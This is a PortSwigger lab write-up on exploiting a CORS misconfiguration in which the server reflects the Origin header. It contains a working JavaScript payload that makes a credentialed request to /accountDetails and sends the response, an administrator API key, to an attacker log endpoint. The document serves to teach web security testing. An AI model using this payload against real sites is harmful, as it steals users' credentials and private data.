# PortSwigger Cross-origin resource sharing (CORS) Lab 1

Lab name
CORS with Basic Origin Reflection

##  How I Solved 
1. **Identified**: Caught the `/accountDetails` request in Burp Suite and saw it reflected `Origin: https://malicious-website.com`.
2. **Exploited**: Hosted the following malicious JavaScript payload on the Exploit Server to read the admin's private data:
   ```html
   <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ade009104e17e94810170a8007a0004-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
   </script>
   ```
3. **Exfiltrated**: Delivered the exploit to the victim and checked the **Access log** to grab the administrator's stolen API key.

##  What I Learned
* **The Vulnerability**: The server blindly trusts and reflects any domain passed in the `Origin` header.
* **The Risk**: When paired with `Access-Control-Allow-Credentials: true`, an attacker site can force a victim's browser to send authenticated requests and steal their private data.
* **Bug Bounty Tip**: Test sensitive API endpoints (like `/profile`, `/account`) by injecting a custom `Origin` header in Burp Suite to check for reflections.
